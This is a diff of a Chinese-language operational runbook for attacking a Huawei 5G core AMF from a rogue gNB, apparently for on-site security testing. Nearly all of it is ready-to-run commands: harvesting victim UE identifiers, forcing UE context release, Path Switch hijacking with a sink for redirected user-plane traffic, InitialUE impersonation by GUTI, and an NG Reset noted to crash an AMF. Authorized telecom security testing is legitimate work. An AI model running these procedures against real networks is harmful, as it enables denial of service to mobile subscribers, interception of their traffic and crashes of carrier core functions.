-终端 C  ./deploy/ngt.sh …                 # 流氓 gNB，一条命令一次关联
-终端 D  ./deploy/extract-ue-ids.sh        # 读本次 AU（不要 sudo；抓包才 sudo --watch）
-```
-
-### 1.1 合法侧（若还没在跑）
+**前提：** 先拿到 GUTI。UE 保持注册。
 
 ```bash
-# 仍在仓库根目录（能 ls 到 deploy/ 和 config/）
-./deploy/real-amf/run-gnb.sh
-# 终端 A 看到: NG Setup procedure is successful
-
-./deploy/real-amf/run-ue.sh
-# 终端 B 看到: Registration is successful
-#              PDU Session establishment is successful
-#              出现网卡 uesimtun0
+./deploy/extract-ue-ids.sh --guti
+# 记下 SET / PTR / TMSI，以及当前 AU（对照用）
+./deploy/real-amf/observe.sh before initial-ue
+sudo ./deploy/real-amf/capture-n2.sh initial-ue
+./deploy/ngt.sh --evidence evidence/huawei-initial-ue.jsonl \
+    initial-ue --amf-set-id 0x<SET> --amf-pointer 0x<PTR> --tmsi <8hex>
 ```
 
-内网**不要 ping 8.8.8.8**。UE 分到地址后：
+若 C 立刻被拒且日志像完整性检查，**同一 GUTI 再打一次**（只加这一个开关）：
 
 ```bash
-./deploy/real-amf/check-up.sh          # 看 uesimtun0 的 IP、网关、ps-list，并 ping 网关
-./deploy/real-amf/check-up.sh --n3     # 再抓 8 秒合法 gNB 上的 GTP-U(UDP 2152)
-# 华为若给了 DNN 内网地址：
-PING_TARGET=<内网地址> ./deploy/real-amf/check-up.sh
+./deploy/ngt.sh --evidence evidence/huawei-initial-ue-int.jsonl \
+    initial-ue --amf-set-id 0x<SET> --amf-pointer 0x<PTR> --tmsi <8hex> \
+    --nas-integrity
 ```
 
-有 UE_IP = PDU 会话已建。网关/PING_TARGET 有回包 = N6 通。`--n3` 能看到 2152 = UPF↔gNB 在传。
-Path Switch 后：合法侧 N3 应变少，`gtpu-sink` 上应出现包。
+**黑盒看什么**
 
-### 1.2 流氓侧先探路
+| 路 | 有后续 | 丢掉 |
+|---|---|---|
+| 终端 C | `DownlinkNASTransport` / `InitialContextSetupRequest` / Service Reject；抄新 AU | `(no reply / Class-2)` |
+| 终端 B | 掉线、Idle、重新 Service Request | 还 CM-CONNECTED |
+| N2 pcap | 上行 proc **15**；下行 NAS / ICS / Service Reject | 只有 15 |
+| observe | AU 变了或 ue-list 异常 | 同一 AU |
+| AMF 日志 | Initial UE / 5G-S-TMSI / 新 NGAP-ID / Service Reject | unknown TMSI / integrity fail |
+
+```
+日期 / 旧 AU / set / ptr / tmsi:
+C 回复:
+学到的新 AU（有则抄）:
+B / observe:
+N2：15 之后下行是什么:
+结论:
+```
+
+---
+
+## 攻击 9：chain-ps-release
+
+**同一条 SCTP**：先 Path Switch（改绑到流氓）再 Release。这是「1 成功之后再拆」的组合，**不要和攻击 2 当成同一条**。
+
+**前提：** 新会话。建议开 sink。
+
+```bash
+./deploy/real-amf/observe.sh before chain-ps
+sudo ./deploy/real-amf/capture-n2.sh chain-ps
+./deploy/ngt.sh gtpu-sink --bind-ip 13.254.241.142 --port 2152
+./deploy/ngt.sh --evidence evidence/huawei-chain-ps.jsonl \
+    chain-ps-release --source-amf-ue-id <AU> --pdu-sessions 1
+```
+
+**黑盒看什么**
+
+| 路 | 链成功 | 半截 / 挡住 |
+|---|---|---|
+| 终端 C | step1 ACK 且有 NCC/NH；step3 `got UEContextReleaseCommand` | step1 无 ACK；或 step3 `NO UEContextReleaseCommand` |
+| 终端 A/B | UE 掉、Idle | 还注册 |
+| N2 pcap | 25 ACK → 42 → 41（Command 可能打给流氓，因其已改绑） | 停在 25 Failure，或 42 后 Error |
+| observe | tun 没了 | 同一 AU |
+
+```
+日期 / AU:
+step1（ACK/NH?）:
+step3（有无 Command / 是否发了 Complete）:
+A/B/observe:
+结论:
+```
+
+---
+
+## 攻击 10：chain-initue-release
+
+同一条 SCTP：InitialUE（GUTI）→ 听下行学新 AU → 再 Release（默认先打旧 AU 再打学到的 AU）。
+
+**前提：** `--guti` + 当前 AU。新会话。
+
+```bash
+./deploy/extract-ue-ids.sh --guti
+./deploy/real-amf/observe.sh before chain-initue
+sudo ./deploy/real-amf/capture-n2.sh chain-initue
+./deploy/ngt.sh --evidence evidence/huawei-chain-initue.jsonl \
+    chain-initue-release \
+    --amf-set-id 0x<SET> --amf-pointer 0x<PTR> --tmsi <8hex> \
+    --victim-amf-ue-id <AU> --release-target both
+```
+
+和攻击 8 一样，若明文 SR 被拒，加 `--nas-integrity` 再打一次（仍用新注册的 AU/GUTI）。
+
+**黑盒看什么**
+
+| 路 | 有学 AU / 有释放 | 中止 |
+|---|---|---|
+| 终端 C | `learned AU=…`；某个 target `got Command` | `ABORT: no release targets`；或两次都 NO Command |
+| 终端 B | 掉线或短暂 Idle | 还在 |
+| N2 pcap | 15 → 下行 NAS → 42 → 41 | 只有 15 |
+| observe | AU 变或空 | 同一 AU |
+
+```
+日期 / 旧 AU / GUTI:
+learned AU:
+victim 那次有无 Command:
+learned 那次有无 Command:
+B/observe:
+结论:
+```
+
+---
+
+## 攻击 11：Handover Notify（裸 p09）
+
+不先开 HO 窗，直接对 AU 发 `HandoverNotify`。OAI 上这条会让 AMF 把 Release 打到**合法 gNB**。
+
+**前提：** 新会话（或 11–15 连打的第一条）。不要和攻击 5 叠。
+
+```bash
+./deploy/real-amf/observe.sh before ho-notify
+sudo ./deploy/real-amf/capture-n2.sh ho-notify
+./deploy/ngt.sh --evidence evidence/huawei-ho-notify.jsonl \
+    handover-notify --amf-ue-id <AU>
+```
+
+**黑盒看什么**
+
+| 路 | 跨 gNB 释放 | 忽略 |
+|---|---|---|
+| 终端 C | Class-2，4 秒内可能无回 | ErrorIndication |
+| 终端 A | Release Command | 无变化 |
+| observe | UE 掉 | 同一 AU |
+| N2 pcap | 上行 proc **11**；合法侧随后 **41** | 只有 11 |
+
+```
+日期 / AU:
+A 有无 Release:
+observe:
+N2：11 之后有无 41、在哪条 SCTP:
+结论:
+```
+
+---
+
+## 攻击 12：PDU Session Resource Notify
+
+对 AU 发 Class-2 Notify。有的栈会按 AU 改绑 `ranUe`。
+
+```bash
+./deploy/real-amf/observe.sh before pdu-notify
+sudo ./deploy/real-amf/capture-n2.sh pdu-notify
+./deploy/ngt.sh --evidence evidence/huawei-pdu-notify.jsonl \
+    pdu-notify --amf-ue-id <AU>
+```
+
+**黑盒看什么：** N2 上行 proc **30**；A/B/observe 有没有掉或会话异常；AMF 是否把 Notify 往 SMF 转（日志里 PDU session notify / 该 IMSI）。多数栈会忽略——**忽略也是结论**。
+
+```
+日期 / AU:
+C 4 秒内有无回:
+A/B/observe 有无变化:
+N2：只有 30，还是后面有 Error / 改会话:
+结论（改绑或拆会话 / 忽略）:
+```
+
+---
+
+## 攻击 13：Cell Traffic Trace
+
+对 AU 发 Trace，TCE 地址填本机。看会不会改受害 trace 状态或再绑。
+
+```bash
+./deploy/real-amf/observe.sh before cell-trace
+sudo ./deploy/real-amf/capture-n2.sh cell-trace
+./deploy/ngt.sh --evidence evidence/huawei-cell-trace.jsonl \
+    cell-trace --amf-ue-id <AU>
+```
+
+**黑盒看什么：** N2 上行 proc **2**；A/B 通常不应掉线；AMF 日志搜 Trace / TCE / `13.254.241.142`。会话无变化 = 忽略。
+
+```
+日期 / AU:
+会话还在?:
+N2 proc 2 之后有无下行:
+AMF 是否提到 TCE:
+结论:
+```
+
+---
+
+## 攻击 14：Uplink RAN Status Transfer（裸 p21）
+
+不在 HO 窗里发 PDCP 状态。开源上常被「当前不在 HO」挡掉。对照攻击 5。
+
+```bash
+./deploy/real-amf/observe.sh before ul-ran-status
+sudo ./deploy/real-amf/capture-n2.sh ul-ran-status
+./deploy/ngt.sh --evidence evidence/huawei-ul-ran-status.jsonl \
+    ul-ran-status --amf-ue-id <AU>
+```
+
+**黑盒看什么：** N2 上行 proc **49**；有无 `DownlinkRANStatusTransfer` 回给流氓；A/B 有无异常。预期多为忽略。
+
+```
+日期 / AU:
+C 有无 DownlinkRANStatusTransfer:
+会话:
+N2:
+结论（中继 / 忽略）:
+```
+
+---
+
+## 攻击 15：Uplink UE-associated NRPPa
+
+往受害定位会话塞占位 NRPPa。
+
+```bash
+./deploy/real-amf/observe.sh before ul-nrppa
+sudo ./deploy/real-amf/capture-n2.sh ul-nrppa
+./deploy/ngt.sh --evidence evidence/huawei-ul-nrppa.jsonl \
+    ul-nrppa --amf-ue-id <AU>
+```
+
+**黑盒看什么：** N2 上行 proc **50**；有无下行 NRPPa；A/B 不应无故掉线。忽略是常见结论。
+
+```
+日期 / AU:
+C 有无下行:
+会话:
+N2:
+结论:
+```
+
+---
+
+## 攻击 16：NG Reset（最后做）
+
+部分 Reset，列表里带受害 AU。Open5GS 上**单包崩过 AMF**。做完立刻再 `sctp-ping` / `ng-setup`，看 AMF 还活着没有。
+
+**前提：** 其它条都做完。新会话。
+
+```bash
+./deploy/real-amf/observe.sh before ng-reset
+sudo ./deploy/real-amf/capture-n2.sh ng-reset
+./deploy/ngt.sh --evidence evidence/huawei-ng-reset.jsonl \
+    ng-reset --targets <AU>:1
+```
+
+若上面受害完全没变，**同一新 AU** 再打只带 AMF-ID 的变体（有的栈只在这条路径上全局查找）：
+
+```bash
+./deploy/ngt.sh --evidence evidence/huawei-ng-reset-amfonly.jsonl \
+    ng-reset --targets <AU>
+```
+
+然后立刻：
 
 ```bash
 ./deploy/ngt.sh sctp-ping
-# 成功: SUCCESS，源 IP 应为 13.254.241.142
-
 ./deploy/ngt.sh ng-setup
-# 成功: NG Setup ACCEPTED
 ```
 
-`sctp-ping` timeout 时：确认 `huawei.json` 的 `bind_ip` 是 `13.254.241.142`（和 UERANSIM
-同一源 IP）。华为**允许多条 SCTP**，不必停合法 gNB。仍超时就抓包看 INIT 有没有 INIT-ACK，
-以及本机是否真有这张地址：`ip -4 addr | grep 13.254.241.142`。
+**黑盒看什么**
 
----
-
-## 2. 怎么拿到「这一次」的受害者标识
-
-华为 AU 随机，**每次 UE 重新注册都会变**。打完若 UE 重注册了，必须重读。
-
-### 办法 A（推荐）：问 gNB 的 ue-list
-
-AU 在 **gNB** 上，不在 UE 的 `info` 里。脚本会跑：
-
-```text
-nr-cli --dump
-nr-cli UERANSIM-gnb-460-08-1 --exec "ue-list"
-# amf-ngap-id: <这就是 AU>
-```
-
-```bash
-./deploy/extract-ue-ids.sh
-```
-
-### 办法 A2：抓包（必须在注册过程中抓）
-
-```bash
-# 先开抓，再重启终端 B 的 run-ue.sh
-sudo ./deploy/extract-ue-ids.sh --watch
-# 或
-sudo tcpdump -i any -s 0 -w /tmp/n2.pcap host 14.66.2.5 and sctp
-# Ctrl-C 后
-sudo ./deploy/extract-ue-ids.sh -r /tmp/n2.pcap
-```
-
-注册完再抓 20 秒，空结果是正常的。`InitialContextSetup` 里才一定有 AU。
-
-### 办法 B：读 UERANSIM 日志
-
-终端 A 默认日志往往不打印 AU。GUTI 看终端 B（nr-ue）。手动能跑：
-
-```bash
-~/UERANSIM/build/nr-cli --dump
-~/UERANSIM/build/nr-cli UERANSIM-gnb-460-08-1 --exec "ue-list"
-```
-
-终端 B（nr-ue）搜 `GUTI` / `5G-S-TMSI` / `TMSI`，拆出：
-
-| 字段 | 给谁 |
-|---|---|
-| AMF-UE-NGAP-ID | `--amf-ue-id` / `--source-amf-ue-id` |
-| 5G-TMSI（8 hex） | `--tmsi` |
-| AMF Set ID（10 bit） | `--amf-set-id` |
-| AMF Pointer（6 bit） | `--amf-pointer` |
-
-### 不要用
-
-```bash
-./deploy/ngt.sh sweep --attack ue-release --amf-range 1-2000   # 对华为无效
-```
-
----
-
-## 3. 以后要加的攻击（本次不要跑）
-
-仓库里能跑的 CLI 都列在这里，**方便以后按同样格式往文首后面加**。
-现在只做攻击 2（ue-release）。不要发 CASE id。
-
-`<AU>` = **这一次**从合法 NGAP 读到的 AMF-UE-NGAP-ID。每条命令（除 sctp-ping / gtpu-sink）都会自己再做一次 NG Setup。
-
-```bash
-NGT=./deploy/ngt.sh
-AU=<本次读到的数字>
-```
-
-### 3.0 全部 CLI 对照（18 条可跑 + 1 条华为不要用）
-
-| # | 命令 | 要 AU？ | 开源上测过什么 |
+| 路 | 拆了 UE | 崩了 AMF | 挡住 |
 |---|---|---|---|
-| 1 | `sctp-ping` | 否 | L4 探路 |
-| 2 | `ng-setup` | 否 | 流氓 gNB 被接受 |
-| 3 | `path-switch` | 要 | 泄 {NH,NCC}，有的还泄 N3 |
-| 4 | `ue-release` | 要 | 跨 gNB 释放 UE |
-| 5 | `error-indication` | 要 | 跨 UE 释放 |
-| 6 | `ng-reset` | 要 | Open5GS 曾崩 AMF |
-| 7 | `handover-required` | 要 | 强制切换 |
-| 8 | `ho-window-inject` | 要 | 自开 HO 窗 + p21/p09 |
-| 9 | `ran-config-update` | 否 | 假 TAI 截寻呼 |
-| 10 | `ul-ran-config-transfer` | 否（要目标 gNB-ID） | SON/Xn 盲中继 |
-| 11 | `initial-ue` | 否（要 GUTI） | 用 5G-S-TMSI 开新上下文 |
-| 12 | `chain-ps-release` | 要 | Path Switch 紧接着 Release |
-| 13 | `chain-initue-release` | GUTI（AU 可选） | InitUE 再 Release |
-| 14 | `handover-notify` | 要 | p09 |
-| 15 | `pdu-notify` | 要 | p06 |
-| 16 | `cell-trace` | 要 | p17 |
-| 17 | `ul-ran-status` | 要 | p21 |
-| 18 | `ul-nrppa` | 要 | p16 |
-| 19 | `gtpu-sink` | 否 | 接被重定向的下行 |
-| — | `sweep` | — | **华为 AU 随机，不要用** |
+| 终端 C | `NGResetAcknowledge` | 无回 / 关联断 | ACK 但受害还在 |
+| 终端 A | UE 被拆；或 **NG 全断** | gNB 报 AMF 断 | 无变化 |
+| observe | AU 空 | 连 N2 都没了 | 同一 AU |
+| N2 pcap | 上行 proc **20**，下行 Ack；合法侧随后 41 或 Reset | 20 之后 AMF 不再回任何包 | 只有 20+Ack |
+| 随后 sctp-ping | 仍 SUCCESS | **FAIL** | SUCCESS |
+| AMF 日志 | Reset 该 UE / 进程没了 | core / restart | 作用域限制在发送方 gNB |
 
-菜单里 `Handover Cancel` / `Uplink Non-UE NRPPa` 显示 TODO，现场不要点。华为也不要发 3.5 的 CASE id。
-
-### 3.1 主线
-
-```bash
-$NGT path-switch --source-amf-ue-id $AU --pdu-sessions 1
-$NGT ue-release --amf-ue-id $AU
-$NGT error-indication --amf-ue-id $AU
-$NGT ng-reset --targets ${AU}:1
-$NGT handover-required --amf-ue-id $AU
-$NGT ho-window-inject --amf-ue-id $AU --mode both
-$NGT ran-config-update --listen 30
-$NGT ul-ran-config-transfer --target-gnb-id 1
+```
+日期 / AU:
+变体（AU:1 还是 只 AU）:
+C:
+随后 sctp-ping / ng-setup:
+A/B/observe:
+结论（挡住 / 拆该 UE / AMF 不可达）:
 ```
 
-### 3.2 组合链 + 单独 InitialUE
-
-```bash
-$NGT chain-ps-release --source-amf-ue-id $AU --pdu-sessions 1
-
-$NGT initial-ue --amf-set-id 0x<setid> --amf-pointer 0x<ptr> --tmsi <8hex>
-
-$NGT chain-initue-release \
-    --amf-set-id 0x<setid> --amf-pointer 0x<ptr> --tmsi <8hex> \
-    --victim-amf-ue-id $AU --release-target both
-```
-
-### 3.3 新 5 条报文
-
-```bash
-$NGT handover-notify --amf-ue-id $AU
-$NGT pdu-notify      --amf-ue-id $AU
-$NGT cell-trace      --amf-ue-id $AU
-$NGT ul-ran-status   --amf-ue-id $AU
-$NGT ul-nrppa        --amf-ue-id $AU
-```
-
-### 3.4 数据面接收（配合 path-switch）
-
-```bash
-$NGT gtpu-sink --bind-ip 13.254.241.142 --port 2152
-```
-
-### 3.5 CASE 目录 —— 华为现场不要用
-
-`docs/cases/` 和菜单「Run attack CASE by id」是实验室变体。代码里 **AU 写死为 1**，
-Path Switch 的 N3 写死 `172.30.200.9`。在华为上发出去等于打一个不存在的 UE。
-主线请只用上面的 `$NGT … --amf-ue-id $AU`。
-
-下面只作对照（哪些变体曾经存在），**不要在华为菜单里发这些 id**：
-
-| id | 报文 |
-|---|---|
-| p01-a/b/c/d/f | PathSwitchRequest 变体 |
-| p02-a/b | UEContextReleaseRequest 变体 |
-| p03-a/b/d | HandoverRequired 变体 |
-| p04-a | HandoverCancel（无独立 CLI） |
-| p05-a/b/e/f | PDUSessionResourceModifyIndication |
-| p06-a | PDUSessionResourceNotify |
-| p09-a | HandoverNotify |
-| p11-a | RRCInactiveTransitionReport |
-| p12-a | UERadioCapabilityInfoIndication |
-| p13-a | SecondaryRATDataUsageReport |
-| p14-a | LocationReport |
-| p15-a | LocationReportingFailureIndication |
-| p16-a | Uplink UE-assoc NRPPa |
-| p17-a | CellTrafficTrace |
-| p19-a | RANCPRelocationIndication |
-| p21-a | UplinkRANStatusTransfer |
-| p22-a | UplinkRANEarlyStatusTransfer |
-| g01-a/b/d | NGReset 变体 |
-| g02-a | RANConfigurationUpdate |
-| g03-a/b | NGSetupRequest 变体 |
-| g04-a | ErrorIndication（非 UE 关联） |
-| g07-a | PWSRestartIndication |
-| g08-a | PWSFailureIndication |
-| g09-a | UplinkRANConfigurationTransfer |
-| g10-a | Uplink Non-UE NRPPa（无独立 CLI） |
-| g11-a | UplinkRIMInformationTransfer |
-
-交互菜单发主线（选 `7` Huawei AMF）也可以，和 `$NGT` 是同一套包。
-
-```bash
-.venv/bin/python -m ngaptester.menu
-./deploy/ngt.sh -h
-```
+**不要**对一串 AU 连打 Reset。一次一条。
 
 ---
 
-## 4. 怎么判断「打中了」
+## 总记录表（华为是新靶，开源结论不能套）
 
-同时看四边：
+| # | 攻击 | N2 上行 | AMF 回攻击者 | 合法 gNB | 受害 UE | 备注 |
+|---|---|---|---|---|---|---|
+| 0 | sctp-ping / ng-setup | 21 | | — | — | 源 IP= |
+| 1 | path-switch | 25 | ACK? NH? | N3? | | |
+| 2 | ue-release | 42 | | 有 41? | | |
+| 3 | error-indication | 9 | | | | |
+| 4 | handover-required | 12 | | | | |
+| 5 | ho-window-inject | 12/13/11/49 | HO Request? | | | |
+| 6 | ran-config-update | 35 | ACK? Paging? | | — | |
+| 7 | ul-ran-config-transfer | 48 | — | 有 47? | — | |
+| 8 | initial-ue | 15 | DL NAS? | | | GUTI= |
+| 9 | chain-ps-release | 25+42 | | | | |
+| 10 | chain-initue-release | 15+42 | learned AU? | | | |
+| 11 | handover-notify | 11 | | 41? | | |
+| 12 | pdu-notify | 30 | | | | |
+| 13 | cell-trace | 2 | | | | |
+| 14 | ul-ran-status | 49 | | | | |
+| 15 | ul-nrppa | 50 | | | | |
+| 16 | ng-reset | 20 | Ack? AMF 还活? | | | |
 
-1. **终端 C（ngt）**：ACK / Error Indication / 无回 / 解码出的 NH·NCC·N3
-2. **终端 B（UE）**：是否还 `CM-CONNECTED`、`uesimtun0` 是否还在、ping 是否断
-3. **终端 A（合法 gNB）**：是否出现 UE Context Release / Radio link failure
-4. **华为 AMF 日志**（若能看）：该 IMSI 上下文是否被释放、是否切到 gNB 4660
-
-建议每条命令加证据文件：
-
-```bash
-$NGT --evidence evidence/huawei-path-switch.jsonl path-switch --source-amf-ue-id $AU
-```
-
----
-
-## 5. 现场记录表（华为是新靶，开源结论不能直接套）
-
-**这次填 sctp-ping / ng-setup / ue-release。** path-switch 行若攻击 1 已填就不要改。其它行留给以后。
-
-| 攻击 | 发出 | AMF 回复 | 受害 UE | 合法 gNB | 备注 |
-|---|---|---|---|---|---|
-| sctp-ping | | | — | — | 源 IP= |
-| ng-setup | | Accept / Reject | — | — | |
-| path-switch | | | | | NH/NCC/N3? |
-| ue-release | | | | | |
-| error-indication | | | | | |
-| ng-reset | | | | | AMF 是否还活着 |
-| handover-required | | | | | |
-| ho-window-inject | | | | | |
-| ran-config-update | | | | | 截到 TMSI? |
-| ul-ran-config-transfer | | | | | |
-| initial-ue | | | | | 用 GUTI |
-| chain-ps-release | | | | | |
-| chain-initue-release | | | | | |
-| gtpu-sink + path-switch | | | | | 是否收到下行 |
-| handover-notify | | | | | |
-| pdu-notify | | | | | |
-| cell-trace | | | | | |
-| ul-ran-status | | | | | |
-| ul-nrppa | | | | | |
+证据目录：`evidence/huawei-*.jsonl`、`evidence/n2-*.pcap`、`evidence/observe-*.txt`。
 
 ---
 
-## 6. 常见问题
+## 常见问题
 
 | 现象 | 处理 |
 |---|---|
-| `sctp-ping` timeout，UERANSIM 却通 | `huawei.json` 的 `bind_ip` 必须是 `13.254.241.142`。华为允许多条 SCTP，不用停合法 gNB。查本机是否有该地址、抓包看 INIT 有无 INIT-ACK |
-| `ng-setup` REJECT | PLMN/TAC/切片/gNB 4660 / 源 IP 未在华为侧开通 |
-| UE 认证失败 | IMSI/KI/OPc/PLMN 与开户不一致；首次 SQN re-sync 属正常 |
-| 攻击「没反应」 | AU 已过期，或填成了 1 / 扫出来的假 ID。重新 `extract-ue-ids.sh` |
-| `extract-ue-ids.sh` 是空的 | 注册完才抓的。先 `--watch` 再重启 UE；或直接 `./deploy/extract-ue-ids.sh` 走 nr-cli |
-| 合法 UE 掉了还想打下一条 | 重新 `run-ue.sh`，重新读 AU，不要用旧数字 |
+| `sctp-ping` timeout，UERANSIM 却通 | `huawei.json` 的 `bind_ip` 必须是 `13.254.241.142`。华为允许多条 SCTP。查 `ip -4 addr` |
+| `ng-setup` REJECT | PLMN/TAC/切片/gNB 4660 / 源 IP 未开通 |
+| UE 认证失败 | IMSI/KI/OPc/PLMN；首次 SQN re-sync 正常 |
+| 攻击「没反应」 | AU 过期或填成 1。重读 AU。看 N2 pcap 包出没出去 |
+| `extract-ue-ids.sh` 空 | 注册完才抓的。直接无参跑（nr-cli）；或 `--watch` 时再重启 UE |
+| 合法 UE 掉了还想打下一条 | 重新 `run-ue.sh`，重新读 AU |
+| decode-n2 里分不清谁是流氓 | 对齐终端 C 的时间戳；流氓关联在 `ngt.sh` 期间才出现 |
+| Class-2 终端 C 说 no NGAP | 正常。以 pcap + A/B 为准 |
+| `selftest-encode.sh` 失败 | 不要打失败那条，先看打印 |
+
+菜单选 `7` Huawei AMF 也可以发主线，但 **AU 必须手填**。`ho-window-inject` / `initial-ue` / 两条 chain / `sctp-ping` **只有 CLI 有**。
